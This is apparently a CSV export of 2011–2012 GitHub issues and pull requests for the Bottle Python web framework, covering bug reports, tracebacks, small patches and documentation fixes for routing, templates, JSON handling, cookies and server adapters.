291,consider adding info on nginx config,2012-02-29T15:17:27Z,,,,,"The bottle docs mention Apache WSGI setup, they should probably also mention nginx. 
The docs also mention Pound, but AFAICT nginx has now made Pound obsolete.
"
290,Wrong REMOTE_ADDR reported when running with server='fapws3',2012-02-29T11:03:08Z,,,,,"It's a bug of fapws3, not bottle. Reported it at https://github.com/william-os4y/fapws3/issues/34 and resolved.

I'm using python-bottle 0.10.7-1 on Debian, with fapws3 0.10.dev.

I find this problem on a heavily loaded web server. Then I start to test it on my local machine.

With the simple show ip application:

@route('/')
def show_ip():
    ip = request.environ.get('REMOTE_ADDR')
    # or ip = request.get('REMOTE_ADDR')
    # or ip = request['REMOTE_ADDR']
    return ""%s\n"" % ip

run(host='0.0.0.0', port=8080, server='fapws3')

by typing commands quickly (Ctrl-y, Enter, Ctrl-y, Enter, ... ), sometimes I can get:

~$ curl 10.20.1.50:8080 & curl localhost:8080
[1] 14631
10.20.1.50
127.0.0.1
[1]+ DONE curl 10.20.1.50:8080
~$ curl 10.20.1.50:8080 & curl localhost:8080
[1] 14633
127.0.0.1
127.0.0.1

and 

~$ curl 10.20.1.50:8080 & curl localhost:8080
[1] 14403
10.20.1.50
10.20.1.50

I'm not sure where the problem comes, from bottle, or fapws3 or their interaction.
"
289,Allow for zero-copy file uploads.,2012-02-20T02:31:03Z,,,,,"see issue 288 (https://github.com/defnull/bottle/issues/288)
"
288,Allow for zero-copy file uploads.,2012-02-19T23:45:46Z,,,,,"Right now, Bottle directly calls cgi.FieldStorage to parse incoming data.

cgi.FieldStorage has a 'make_file' method defined with the following comment:

```
def make_file(self, binary=None):
    """"""Overridable: return a readable & writable file.

    The file will be used as follows:
    - data is written to it
    - seek(0)
    - data is read from it

    The 'binary' argument is unused -- the file is always opened
    in binary mode.

    This version opens a temporary file for reading and writing,
    and immediately deletes (unlinks) it.  The trick (on Unix!) is
    that the file can still be used, but it can't be opened by
    another process, and it will automatically be deleted when it
    is closed or when the current process terminates.

    If you want a more permanent file, you derive a class which
    overrides this method.  If you want a visible temporary file
    that is nevertheless automatically deleted when the script
    terminates, try defining a __del__ method in a derived class
    which unlinks the temporary files you have created.

    """"""
```

It would be nice if Bottle allowed more easy access to providing your own FieldStorage class implementation, or perhaps specifically allowed for optionally providing a make_file implementation.

My use case is that I would like to have Bottle upload file data directly to its final storage location, instead of being uploaded to a tempfile and then being copied again to its final destination.
"
287,request for pluggable json encode/decode functions to process response,2012-02-16T05:41:00Z,,Needs Documentation,,,"Hi there,

Luv bottle so far. Ran into an expected issue when dealing with json encoding that I have fixed for myself temporarily in my local copy.  

Couple of issues so far:
1/. It is perfectly alright to json encode a list (or a tuple) for that matter - in the pragmatic world of building Ajaxy web apps. The latest dev version (that I am using) checks if the response is a dict and if so applies json encoding on it. I patched mine to apply json encoding if it is a dict or a list. Not 100% sure about tuples so I left it at that.

2/. The response consists of data retrieved from a database and as expected json encoding tripped when it saw datetime and date types. There is a known way to override json package's dumps and loads methods. I took patch (that I had to write when using Py-rs) and just inserted again into my copy of bottle.

Overall, worked around the issue and I am in good shape to continue to use bottle. What nags me is that I had plans of extending my json patch to support direct encoding of database results from the database layer API such as straight dbapi, sqlalchemy - something along the lines of what I found at http://www.mail-archive.com/turbogears-commits@googlegroups.com/msg03926.html - which means I will have to keep patching bottle as new versions get released.

Ideal would be if I could pass json encode and decode functions when Bottle() instantiated - something along the lines of:

<code>
 myapi = Bottle(json_encode = myencoder, json_decode=mydecoder);
</code>

Or some thing along those lines or better. You get the idea.

Making an automatic decision to encode to json based on response type is a pretty significant and important design decision.  And I think should come with an option to allow the user to configure what gets encoded and how.

Thanks,
"
286,Encoding definition improved in SimpleTemplate,2012-02-16T02:42:16Z,2012-02-17T14:00:27Z,,,,"SimpleTemplate crashed when I did it:

```
% a=1
% coding=a
```

This code is useless and probably nobody else will found this bug, I used the word ""coding"" by accident.

After that, I found the regex to parse this encoding and created some tests to break it in other improbable ways.
"
285,SimpleTemplate {% blocks %} proposal,2012-02-15T16:03:26Z,,,,,"Today I was thinking about JavaScript compression and how other frameworks handle it. Flask has Assets [1], Django has a lot of compressor plugins [2] [3]. All of them (which I looked) use template blocks, because they are based on django templates or Jinja2.

I know I can do something similar using Python functions to create blocks, but it is not a reusable way to do it. I can do something like `{{ my_filter('some html') }}`, but I can't do it in a pretty way with a multiline html for example.

I'm not proposing a specific syntax yet, first I want to know if other people want this too. It is a big limitation to me and I don't want to use other template engine, I like SimpleTemplate.

I found an old issue about something similar [4], but I already explained why it doesn't solve the problem. I need to define a function and call it just to render some simple HTML, I don't like it.

[1] http://flask-assets.readthedocs.org/en/latest/index.html
[2] http://djangopackages.com/grids/g/asset-managers/
[3] https://github.com/jezdez/django_compressor
[4] https://github.com/defnull/bottle/issues/20
"
284,"Fix: PATH_INFO always contains ""/"" for mounted app root",2012-02-14T20:40:58Z,,,,,"When application is mounted to `/some_path` then `PATH_INFO` contains `/` for
requests to both `/some_path` and `/some_path/`. So it is probably impossible
to distinguish between these urls in mounted application (e.g. to redirect to
normalized url).

According to wsgi spec `PATH_INFO` **may** be empty in this case. It's seems
to be possible to get desired behaviour by changing `path_shift()`.
"
283,fix a typo in docs/recipes.rst,2012-02-14T19:02:14Z,2012-03-26T18:28:53Z,,,,
282,new rule filter: paging,2012-02-14T03:14:39Z,2012-02-16T05:39:33Z,,,,"Hi:
  The paging is frequent in website.For example,in my website:

```
  @r('/all')
  @r('/all/<page:int>')
  def products(page=1):
      if page==0: page=1
      ... ....
```

  So I write a rule for myself:

```
  #in __init__()
  self.filters['page'] = self.page_filter

    def page_filter(self, conf):
        '''pading'''
        return r'\d+', int, lambda x: int(x) if x>0 else 1
```

  I think it's valuable if merge into master branch.
"
281,Bottle.mount raises DeprecationWarning BaseReuqest.status will change to return a string in 0.11,2012-02-10T17:25:20Z,2012-02-10T19:44:03Z,,,,"Hello,

Bottle.mount raises DeprecationWarning BaseReuqest.status will change to return a string in 0.11 :

bottle-0.10.7-py2.6.egg/bottle.py:583: DeprecationWarning: BaseReuqest.status will change to return a string in 0.11. Use status_line and status_code to make sure.
  return HTTPResponse(rs.body, rs.status, rs.headers)

I guess it should be rs.status_code instead of rs.status_line.

I hope it helped !
Cheers,
CH
"
280,strongly recommend bottle to support unicode native,2012-02-09T07:17:43Z,,,,,"strongly recommend bottle to support unicode native.

django and flask both support unicode native, it's import for  unicode users, thanks!
"
279,WTForms not support bottle's file fields.,2012-02-07T16:05:55Z,,,,,"Because I need to use unicode, so the code is like this:

form = EntryAddForm(obj=request.forms)

Then I find WTForms not support bottle's file fields.
"
278,Possible lockfile undefined,2012-02-02T00:08:14Z,2012-02-02T13:00:17Z,,,,"I never get this error, but I received a thumbs down in StackOverflow possible because of it.

http://stackoverflow.com/questions/8608743/whats-the-best-way-to-disable-jinja2-template-caching-in-bottle-py/8629800#comment11410724_8629800

If something wrong happens with lockfile creation in line 2440 (https://github.com/defnull/bottle/blob/master/bottle.py#L2440), in finally clause the `lockfile` variable don't exists, like it is commented in stackoverflow.

My theory is he is using some server adapter which don't support `reloader=True`.
"
277,parse json less strictly,2012-02-01T01:26:05Z,,,simplejson.decoder.JSONDecodeError,simplejson.decoder.JSONDecodeError: Invalid control character at: line 1 ,"A standard and strict json format is 
{""title"": ""\u6587\u7ae0\u6807\u9898\n\u6362\u884c""}

Sometimes, especially in a cross-language platform, the json would be
{""title"": ""Title
new line""}
Using simplejson.loads(json) might cause the exception to occur:

Traceback (most recent call last):
  File ""testjson.py"", line 24, in <module>
    print simplejson.loads(json)
  File ""/System/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/
site-packages/PIL/**init**.py"", line 384, in loads

  File ""build/bdist.macosx-10.5-i386/egg/simplejson/decoder.py"", line 402, 
in decode
  File ""build/bdist.macosx-10.5-i386/egg/simplejson/decoder.py"", line 418, 
in raw_decode
simplejson.decoder.JSONDecodeError: Invalid control character at: line 1 
column 15 (char 15)

simplejson.loads() has a parameter that is not mentioned in the documentation, “strict”. With this parameter we can parse json string less strictly.

Therefore, is it possible for bottle to change its json parsing as some form like
simplejson.loads(json, strict=False)
and instead of ""request.json['data']"",  is there a more elegant way?
"
276,AttributeError: 'LocalRequest' object has no attribute 'header',2012-01-31T18:58:24Z,2012-02-17T14:32:45Z,,AttributeError,AttributeError: 'LocalRequest' object has no attribute 'header',"( I posted this to the bottlepy Google Group last week, but it's still waiting for a moderator to OK it).

I have been running successfully with bottle 0.9.6. I recently
upgraded to 0.10.7, and now my application is failing with:

Traceback (most recent call last):
  File ""/dls_sw/apps/DataDispenser/python/ws043/lib/python2.7/site-
packages/bottle.py"", line 737, in _handle
    return route.call(*_args)
  File ""/dls_sw/apps/DataDispenser/python/ws043/lib/python2.7/site-
packages/bottle.py"", line 1456, in wrapper
    rv = callback(_a, **ka)
  File ""/dls_sw/apps/DataDispenser/dev/webinterface.py"", line 267, in
login
    destination_url = bottle.request.header.get('Referer',
'/').strip()
AttributeError: 'LocalRequest' object has no attribute 'header'

The changelog indicates that there have been some changes in this area
in 0.10, but looking at the docs, I think bottle.request.header should
still exist.

Is there a change I need to make to my code?

Thanks
"
275,reloader: RuntimeError in thread due to 'dict. size change' (+ workaround),2012-01-29T21:11:47Z,2012-02-01T09:38:48Z,,,,"(Disclaimer: (1)Just starting out with Bottle framework, in attempt to create simple, web-based access to local database, and (2) no professional Python coder.)

Issue: When I enable the auto-reloader with the ""run(reloader=True)"" command on my Ubuntu box (2.6.32-38, 64bit):  

with Python 2.6: all works as expected
with Python 3.2.2: a RuntimeError appears, and the auto-reloader obviously does not start. Here's the error:

> Exception in thread Thread-1:
> Traceback (most recent call last):
>   File ""/home/me/programs/Python-3.2.2/lib/python3.2/threading.py"", line 740, in _bootstrap_inner
>     self.run()
>   File ""/home/me/python/bottle_webFramework/myScripts/bottle.py"", line 2507, in run
>    for module in sys.modules.values():
> RuntimeError: dictionary changed size during iteration

Error can be solved (and functional reloader obtained, as expected), by explicitly declaring as a list in lines 2507 and 2517, but this is probably a dirty workaround only (I'm not familiar with system level thread checks...):

@ 2507
--- for module in sys.modules.values():
+++ for module in list(sys.modules.values()):

@ 2517
--- for path, lmtime in files.items():
+++ for path, lmtime in list(files.items()):

Hope this helps,
thanks for a nice, simple webframework!
"
274,Fixed: Unwanted exception,2012-01-25T06:54:50Z,2012-01-26T13:02:12Z,,,,"I found and hopefully fixed a problem with the reloader. See commit message for details.
"
273,Redirecting from another file,2012-01-13T23:43:25Z,,,,,"user.py

user_app = bottle.Bottle()
@user_app.route('/login')
def login(): redirect(""/index"")

app.py

from user import user_app
root_app = bottle.Bottle()
@root_app.route('/index')
def index(): return ""Bottle is awesome""

root_app.mount('/user', user_app)

I would like to redirect from one file to another, is this possible?
"
272,Print version number when running server,2012-01-11T22:06:18Z,2012-01-12T13:15:52Z,,,,
271,Allow to use 'quiet' arg to disable eventletserver output,2012-01-10T12:31:01Z,2012-01-12T15:33:36Z,,,,"pass `quiet = True` to `bottle.run` to disable annoying eventlet access log. 
"
270,bottle-sqlite doesn't autocommit if you redirect() out of a handler,2012-01-01T22:33:55Z,2012-02-07T18:12:28Z,,,,"https://gist.github.com/1548514 shows the problem. This code contains a tiny Bottle app with `bottle-sqlite` plugin. If you run it, access `/` with your browser, then dump the database, it'll be empty. If you change redirect at the end of the handler to something like `return ""OK""`, the data gets across to database safely.
"
269,load and load_app fail if an app already loaded them,2011-12-28T02:08:17Z,2012-02-07T20:42:19Z,,,,"Using stable, 0.10.  If I have the following files:

v1.py

```
import bottle

@bottle.get('/')
def index():
    return 'Index V1'

@bottle.put('/')
def modify(data):
    return 'Ok'
```

v2.py

```
import bottle
import v1

@bottle.get('/')
def index():
    return 'Index V2 %s' % v1.index()
```

main.py

```
import bottle

v2 = bottle.load_app('v2')
v1 = bottle.load_app('v1')
bottle.mount('/v1', v1)
bottle.mount('/v2', v2)
print 'V1 routes: %s' % len(v1.routes)
print 'V2 routes: %s' % len(v2.routes)

bottle.run(host='localhost', port=8080)
```

It outputs:

```
V1 routes: 0
V2 routes: 3
```

If I swap the ordering of loading v1 and v2, it outputs:

```
V1 routes: 2
V2 routes: 1
```

Also appears if you just call load_app twice on the same module, only the first one works, the rest come up empty.
"
268,bottle==0.10.4 missing def _e(): return sys.exc_info()[1],2011-12-22T13:01:21Z,2011-12-22T15:16:48Z,,,,"Example: http://stackoverflow.com/q/8602563/
"
267,Possible JavaScript injection in line 837,2011-12-16T16:44:58Z,2011-12-17T13:59:43Z,,,,"It was reported in Twitter: https://twitter.com/#!/bw0x00/status/147704870848311297
Line 837: https://github.com/defnull/bottle/blob/master/bottle.py#L837

I tried to create some example to exploit this bug, but I didn't know how to do it.

I guess this error page should be rendered with SimpleTemplate, even if it is really simple to construct the page without it. It doesn't affect performance.
"
266,Cannot install from source,2011-12-16T12:28:06Z,2011-12-16T13:41:43Z,,,,"Hello. I cannot properly install bottle-0.10 from source.

Here's what I've got when I'm trying to import bottle:

```
Traceback (most recent call last):
    File ""<stdin>"", line 1, in <module>
    File ""bottle.py"", line 373
          except re.error, e:
                         ^
```

I'm using Ubuntu 10.04 with python-3.1.2-dev. Also I have installed pymongo3 and pystache.
Thank you.
"
265,100% PEP8 Compliant bottle.py,2011-12-12T20:11:47Z,2013-12-04T12:13:47Z,,,,"Fixed: 400 PEP8 errors, 25 Static Errors.
"
264,Tests to path_filter,2011-12-10T14:33:40Z,2011-12-11T22:58:20Z,,,,"It wasn't tested.
"
263,Fix text in the documentation (copyedit).,2011-12-10T00:47:37Z,2011-12-11T23:01:10Z,,,,
262,Fix text in the documentation (copyedit).,2011-12-10T00:47:11Z,2011-12-11T23:03:11Z,,,,
261,float_filter bug,2011-12-09T17:33:51Z,2011-12-09T20:58:40Z,,,,"This bug was reported by janus in Google Groups: https://groups.google.com/d/topic/bottlepy/WEut1fLk-n4/discussion

I added some tests to float_filter.
"
260,PEP8 edit: Added a blank line after imports,2011-12-07T18:59:10Z,2011-12-08T16:35:24Z,,,,
259,static_file() not working with FAPWS3,2011-12-03T15:00:52Z,2012-02-07T20:43:16Z,,,,"```
from bottle import route, run, static_file, FapwsServer

@route('/static/<filename:path>')
def serve_static(filename):
    return static_file(filename, root='./static')

run(server=FapwsServer, port=8080)
```

I'm getting a 500 error every time I try to access an existing file at http://127.0.0.1:8080/static/style.css, with no error in the terminal; but using the default adapter works. (Python 2.7)
"
258,no2to3 added some bugs...,2011-12-03T12:58:59Z,2011-12-03T14:41:18Z,,,,"Just solving some pretty obvious issues.
- A `_strerr` without underscore.
- Mako and jinja2 tests without an import.
- Removing some useless imports added during no2to3 branch.
"
257,add tox.ini in order to easily test with multiple python versions,2011-12-02T21:49:47Z,2011-12-03T14:42:37Z,,,,"tox allows running tests for multiple python versions with a different
set of installed packages. To try it, run:

tox -e py25,py27-most

The default is to test with python 2.5, 2.6, 2.7, 3.2. These must be
installed on the machine.

tox can be found here: http://pypi.python.org/pypi/tox
"
256,Auto cast a unicode response status to a string if a unicode status is provided,2011-11-29T23:19:39Z,2011-12-01T13:37:12Z,,,,"This bit me, and I felt like it would be smarter to allow unicode response status inputs that get auto cast. Thoughts?
"
255,Mako defaults are not XSS safe,2011-11-28T13:26:31Z,,,,,"Mako is configured to not escape HTML control characters by default. There should be a safe default.
"
254,No2to3,2011-11-25T19:18:12Z,2011-12-02T20:39:23Z,,,,"Tests passing on 3.x
"
253,"Namespace Functions defined, get, setdefault throws ""NameError(""name 'defined' is not defined"",)""",2011-11-24T10:20:09Z,2011-11-24T19:37:53Z,,,,"in http://bottlepy.org/docs/dev/stpl.html it's said ""SimpleTemplate helps you out here: The following three functions are defined in the default namespace and accessible from anywhere within a template:""
but they all throw exceptions when used. or am i missing something
thanks
"
252,Fix heading grammar in docs,2011-11-22T15:54:52Z,2011-11-22T18:31:58Z,,,,
251,start_response result broken and never called,2011-11-13T17:43:07Z,2011-11-15T15:27:37Z,,,,"I'm testing pyflakes and it blame https://github.com/defnull/bottle/blob/master/bottle.py#L554 . It returns an anonymous function using a non-existent `out` variable. If it is called, of course some test should break.

Reading about WSGI protocol, start_response can return a callable to legacy apps,  but I guess something is wrong here.

I removed this line and all tests pass.
"
250,WTForms support,2011-11-13T08:19:27Z,2011-11-15T15:27:37Z,,,,"I find that bottle 0.10dev don't support wtforms, but 0.9 version has been support, can you fix it?
"
249,no doc on how to properly use .mount(),2011-11-10T09:48:31Z,,,,,"basically i would like to have a file handle all ""user/_"" urls and another handle ""blog/_"" urls. how can it be done with mount assuming i already have a ""hello word"" root app running
Thanks
"
248,validate() decorator cannot work with sqlite.plugin,2011-11-07T09:36:27Z,2011-11-10T09:38:21Z,,,,"the @validate decorator will not work if used together with sqlite plugin since it requires the use of non-keyword argument
using the web todo list tutorial from official website as example 

...
@route('/edit/:no', method='GET', apply=sqlite.Plugin(dbfile='todo.db'))
@validate(no=int)
def edit_item(db, no):
...

calling the url @ /edit/2 will return http error 500
TypeError('edit_item() takes exactly 2 non-keyword arguments (0 given)',)
"
247,set_cookie's doc incorrectly says path defaults to /,2011-10-31T12:17:57Z,2011-11-15T15:27:38Z,,,,"The doc says that the default value of path in set_cookie is '/', but that's not what RFC 2109 says:

<pre>   Path   Defaults to the path of the request URL that generated the
          Set-Cookie response, up to, but not including, the
          right-most /.
</pre>
"
246,Small docs typo.,2011-10-30T16:03:13Z,2011-11-06T13:57:17Z,,,,"Fixes defnull/bottle#243.
"
245,add SocketIOServer support,2011-10-29T01:15:18Z,2012-04-05T08:58:15Z,,,,"socketio is based on gevent-socketio, so i got issue #212 for running the test case on both the gevent and socketio server.

other than that, it works
"
244,support auto reload when modify script,2011-10-28T03:56:31Z,2011-10-28T09:30:13Z,,,,"in flask, it will auto reload, could you support that for develop quickly.
"
243,doc typo in submit form,2011-10-27T15:59:48Z,2011-11-10T09:43:49Z,,,,"in http://bottlepy.org/docs/dev/tutorial.html#request-routing login_form function.

```
return """"""<form method=""POST"">
          <input name=""name""     type=""text"" />
          <input name=""password"" type=""password"" />
          </from>""""""
```

should be

```
return """"""<form method=""POST"" >
            Login Form
            <br/>Name: <input name=""name""     type=""text"" />
            <br/>Password: <input name=""password"" type=""password"" />
            <br/><input type=""submit"" value=""Submit"">
            </form>""""""
```
"
242,set_cookie() does not work with expire=date/datetime/int,2011-10-27T10:11:27Z,2011-10-27T15:11:10Z,Bug,,,"The `expires` parameter for Response.set_cookie() does not work as documented or expected. It should accept epoch timestamps and datetime objects, too.

Details: http://stackoverflow.com/questions/7913169/python-bottle-persistent-cookie-not-working
"
241,Python3 Cookie Encode/Decode Error,2011-10-20T02:52:48Z,2011-10-24T15:45:59Z,,TypeError,"TypeError: expected bytes, but got 'str'","After running 2to3, bottle.py would fail to encode secure cookies, raising the following type error and issuing an HTTP 500:

```
TypeError: expected bytes, but got 'str'
```

To fix this, I simply encoded the key in both cookie_encode and cookie_decode. The bug has been marked as ""wontfix"" in the Python Standard Library, per issue 5285: http://bugs.python.org/issue5285

Also fixes the same issue in Python 2.6 and is backwards compatible with 2.5, as noted above.
"
240,Bottle server crashes on reload when code has syntax error,2011-10-18T20:17:48Z,2011-11-15T21:34:35Z,Request,,,"In my attempts to get around this myself, I've discovered that this may simply be impossible, but it would be really nice if the bottle server (`bottle.run(reloader=True)`) wouldn't crash out when it reloads a file with a syntax error.  

I realize that this may be impossible to fix since it's the interpreter itself throwing the exception, but if the server could somehow catch this and keep itself alive until the next reload it would be much more convenient.  The main reason I use the dev server instead of Apache is that I don't want to restart the server for every code change I make.  But I find that the bottle server has to be restarted almost as often as Apache because of syntax errors (and other import-time exceptions) that crash the app.

Maybe there's a way to code my wsgi script to handle this myself, but I haven't found a working method.
"
239,"Allow options to be passed into GunicornServer (e.g. worker_class, worker",2011-10-11T21:49:29Z,2011-10-11T22:26:12Z,,,,"Allow options to be passed into GunicornServer (e.g. worker_class, workers)
"
238, jinja2_template not support globals setting,2011-10-05T15:56:35Z,2011-10-17T10:42:02Z,,,," jinja2_template not support globals setting.
can you add  the globals setting to jinja2_template?so if I put request in the globals setting, I can use request directly in the jinja2 template files.bless you.
I realize it like this:

class Jinja2Template(BaseTemplate):
    def prepare(self, filters=None, tests=None, globals=None, *_kwargs):
        from jinja2 import Environment, FunctionLoader
        if 'prefix' in kwargs: # TODO: to be removed after a while
            raise RuntimeError('The keyword argument `prefix` has been removed. '
                'Use the full jinja2 environment name line_statement_prefix instead.')
        self.env = Environment(loader=FunctionLoader(self.loader), *_kwargs)
        if filters: self.env.filters.update(filters)
        if tests: self.env.tests.update(tests)

```
    if globals: self.env.globals.update(globals)

    if self.source:
        self.tpl = self.env.from_string(self.source)
    else:
        self.tpl = self.env.get_template(self.filename)
```
# Mod-End
"
237,"In 0.10 dev,the FormsDict's get method and [] method are not equal to getunicode method",2011-10-05T15:54:59Z,2011-10-17T10:42:14Z,,,," I saw the source code of bottle of 0.10 dev.In my opintion, if the FormsDict's get method and [] method are equal to getunicode method, should it be easy to unicode users?All right, I know this will be not compatible to the old app, But I think it deserve it.Bless you ~~
I try to realize it like this:

class FormsDict(MultiDict):
    #: Encoding used for attribute values.
    input_encoding = 'utf8'

```
def get(self, key, default=None, index=-1, type=None, encoding=None):
    try:
        val = self.dict[key][index]
        value = type(val) if type else val
    except Exception, e:
        return default

    if value is None or type not in (None, str, bytes, unicode):
        return value

    enc = encoding or self.input_encoding

    try:
        if isinstance(value, bytes): # Python 2 WSGI
            return value.decode(enc)
        elif isinstance(value, unicode): # Python 3 WSGI
            return value.encode('latin1').decode(enc)
        return value
    except UnicodeError, e:
        return default

__getattr__ = __getitem__ = get
```
"
236,Error handler crashes with redirect,2011-10-04T22:21:29Z,,,,,"It happens because redirect exception is not handled by Bottle, because it already get an exception (404).

```
import bottle

@bottle.error(404)
def error_route(code):
    bottle.redirect('/')

bottle.debug(True)
bottle.run(reloader=True)
```

I get this exception:

```
<pre>HTTPResponse('HTTP Response 303',)</pre>
<h2>Traceback:</h2>
<pre>Traceback (most recent call last):
  File ""/tmp/t/bottle.py"", line 788, in wsgi
    out = self._cast(self._handle(environ), request, response)
  File ""/tmp/t/bottle.py"", line 741, in _cast
    out = self.error_handler.get(out.status, repr)(out)
  File ""a.py"", line 5, in error_route
    bottle.redirect('/')
  File ""/tmp/t/bottle.py"", line 1748, in redirect
    raise HTTPResponse("""", status=code, header=dict(Location=location))
HTTPResponse: HTTP Response 303
</pre>
```
"
235,"In docs, Tutorial is called Documentation",2011-10-01T04:47:23Z,2011-10-30T15:47:03Z,,,,"The Tutorial page is called Documentation. I suggest to change it to Tutorial, because everything is documentation (/docs/...). 
"
234,Heroku recipe,2011-09-29T17:30:40Z,2011-09-30T10:36:52Z,,,,"Mostly it's just adding links to their documentation. They've done a pretty good job going over everything.
"
233,Two small issues,2011-09-28T16:59:07Z,2011-09-28T17:53:32Z,,,,"An error in SimpleTemplate examples was reported in mailing list (replacing left->leftblock and right->rightblock).

Issue #232 describes another doc error (thanks @pgoetz).
"
232,Documentation correction,2011-09-28T16:33:26Z,2011-09-30T10:44:28Z,,,,"Under:
http://bottlepy.org/docs/dev/tutorial.html#plugins
Application-wide Installation

""Most plugins are save to be installed to all routes and are smart enough to not add overhead to callbacks that do not need their functionality.""

should be

""Most plugins can safely be installed to all routes ...""
"
231,view decorator and plugin keywords issue.,2011-09-28T12:49:42Z,2011-09-28T16:14:46Z,,`TypeError,`TypeError: test() takes exactly 1 argument (0 given)`,"I'm trying to mix the `@view` decorator with the [bottle-sqlalchemy plugin](https://github.com/iurisilvio/bottle-sqlalchemy/), more or less the same as the attached unit test.

This unit test crash with:
`TypeError: test() takes exactly 1 argument (0 given)`
"
230,Add ShpamlTemplate class (& shpaml_template/shpaml_view helpers).,2011-09-25T23:52:13Z,,,,,"This allows templates to be written using SHPAML
(http://shpaml.webfactional.com/) combined with standard SimpleTemplate
directives. The SHPAML templates are transparently converted into HTML
before the SimpleTemplate compilation process. As the compiled
SimpleTemplate code is cached the conversion only happens once and there
is no runtime overhead (except for first call).

As an example:

```
>>> t = """"""\
... html
...   head
...     title | {{title}}
...   body
...     h1 | {{title}}
...     ul.list
...       %for i in l:
...         li.item | {{i}}
...       %end
... """"""
>>> print ShpamlTemplate(t).render(title=""Title"",l=[1,2,3])
<html>
  <head>
    <title>Title</title>
  </head>
  <body>
    <h1>Title</h1>
    <ul class=""list"">
        <li class=""item"">1</li>
        <li class=""item"">2</li>
        <li class=""item"">3</li>
    </ul>
  </body>
</html>

```

A test suite is included which covers pretty much all of the
SimpleTemplate functionality embedded into SHPAML.

From the SHPAML web-site:

SHPAML is a mini language that can help you to build web pages more
quickly. It leverages familiar concepts from HTML and CSS, while
striving to bring brevity and clarity to the primary documents that you
edit. It plays nice with templating languages.
"
229,SimpleTemplate: %rebase does not cache base_template ,2011-09-25T20:49:37Z,2011-09-25T21:11:03Z,,,,"(Hopefully sending the right branch this time)

I noticed that when you use %rebase base_template in SimpleTemplate a new instance of base_template is created for every call and not saved in the cache (which the subtemplate function does for %include sub_template). This is clearly somewhat inefficient & I attach a diff which fixes this (implementing %rebase using the existing subtemplate function).

(I am not too familiar with Git pull-requests so hope this is the right thing to do)
"
228,SimpleTemplate: %rebase does not cache base_template ,2011-09-25T19:54:32Z,2011-09-25T20:49:52Z,,,,"I noticed that when you use `%rebase base_template` in SimpleTemplate a new instance of `base_template` is created for every call and not saved in the cache (which the `subtemplate` function does for `%include sub_template`). This is clearly somewhat inefficient & I attach a diff which fixes this (implementing `%rebase` using the existing `subtemplate` function).

(I am not too familiar with Git pull-requests so hope this is the right thing to do)
"
227,SimpleTemplate: %rebase does not cache base_template,2011-09-25T19:41:02Z,2011-09-25T19:55:53Z,,,,"I noticed that when you use `%rebase base_template` in SimpleTemplate a new instance of base_template is created for every call and not saved in the cache (which the `subtemplate` function does for `%include sub_template`). This is clearly somewhat inefficient & I attach a diff which fixes this (implementing `%rebase` using the existing `subtemplate` function).

```
diff --git a/bottle.py b/bottle.py
index ff94536..81ce2cb 100755
--- a/bottle.py
+++ b/bottle.py
@@ -2658,10 +2658,9 @@ class SimpleTemplate(BaseTemplate):
         eval(self.co, env)
         if '_rebase' in env:
             subtpl, rargs = env['_rebase']
-            subtpl = self.__class__(name=subtpl, lookup=self.lookup)
             rargs['_base'] = _stdout[:] #copy stdout
             del _stdout[:] # clear stdout
-            return subtpl.execute(_stdout, rargs)
+            return self.subtemplate(subtpl,_stdout,rargs)
         return env

     def render(self, *args, **kwargs):
```
"
226,json content-type,2011-09-25T19:11:07Z,2011-09-25T19:49:57Z,,,,"i was porting https://github.com/ccarpenterg/todolist to learn bottle. the backend works pretty well with chrome browser, but not with FireFox. It looks like FF submits the ('Content-Type', 'application/json; charset=UTF-8') while the code in bottle.py only looks for an exact match of application/json in Content-Type.

here's the patch:

```
@DictProperty('environ', 'bottle.request.json', read_only=True)
def json(self):
    ''' If the ``Content-Type`` header is ``application/json``, this
        property holds the parsed content of the request body. Only request\
```

s
            smaller than :attr:`MEMFILE_MAX` are processed to avoid memory
            exhaustion. '''
        #if self.environ.get('CONTENT_TYPE') == 'application/json' \
        if 'application/json' in self.environ.get('CONTENT_TYPE') \
        and 0 < self.content_length < self.MEMFILE_MAX:
            return json_loads(self.body.read(self.MEMFILE_MAX))
        return None
"
225,Fix typo in documentation (Ignore trailing slashes),2011-09-23T11:28:33Z,2011-09-23T19:20:27Z,,,,"Just a quick fix of a typo ""appmy"" was replaced by ""myapp"" ;)
"
224,workaround for bug in functools.update_wrapper for bound methods.,2011-09-23T05:31:13Z,2011-11-22T18:33:20Z,,,,"arguably a fix for https://github.com/defnull/bottle/issues/223 though there are other places where functools.update_wrapper is called.  this is sufficient for my needs.
"
223,bug with functools pre-3.2.x prevents clean class-based bottle servers,2011-09-23T04:35:53Z,2011-11-22T18:30:25Z,,AttributeError,AttributeError: 'instancemethod' object has no attribute '__module__',"I'm attempting to make bottle applications work more nicely in encapsulated classes, e.g.

class BottleServer(object):
  @staticmethod
  def route(_args, *_kwargs):
    def annotated(function):
      if hasattr(function, '**routes**'):
        function.**routes**.append( (args, kwargs) )
      else:
        function.**routes** = [(args, kwargs)]
      return function
    return annotated

  def **init**(self):
    self._app = bottle.Bottle()
    for attr in dir(self):
      if hasattr(self, attr) and hasattr(getattr(self, attr), '__routes__'):
        for rt in getattr(self,attr).**routes**:
          kw = copy.deepcopy(rt[1])
          kw.update({'callback': getattr(self, attr)})
          self._app.route(_rt[0], *_kw)

  def run(self, hostname, port):
    bottle.run(self._app, host=hostname, port=port)

class Foo(BottleServer):
  def **init**(self):
    BottleServer.**init**(self)

  @BottleServer.route('/hello')
  @BottleServer.route('/hello/:first')
  def hello(self, **kw):
    return 'hello: %s!' % repr(kw)

But unfortunately this results in:
  File ""bok.py"", line 45, in **init**
    self._app.route(_rt[0], *_kw)
  File ""/private/tmp/bottle-0.9.6/bottle.py"", line 642, in route
    return decorator(callback) if callback else decorator
  File ""/private/tmp/bottle-0.9.6/bottle.py"", line 640, in decorator
    if DEBUG: route.prepare()
  File ""/private/tmp/bottle-0.9.6/bottle.py"", line 446, in prepare
    self.call
  File ""/private/tmp/bottle-0.9.6/bottle.py"", line 156, in __get__
    value = obj.**dict**[self.func.**name**] = self.func(obj)
  File ""/private/tmp/bottle-0.9.6/bottle.py"", line 437, in call
    return self._make_callback()
  File ""/private/tmp/bottle-0.9.6/bottle.py"", line 478, in _make_callback
    functools.update_wrapper(callback, self.callback)
  File ""/Users/wickman/Local/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/functools.py"", line 33, in update_wrapper
    setattr(wrapper, attr, getattr(wrapped, attr))
AttributeError: 'instancemethod' object has no attribute '__module__'

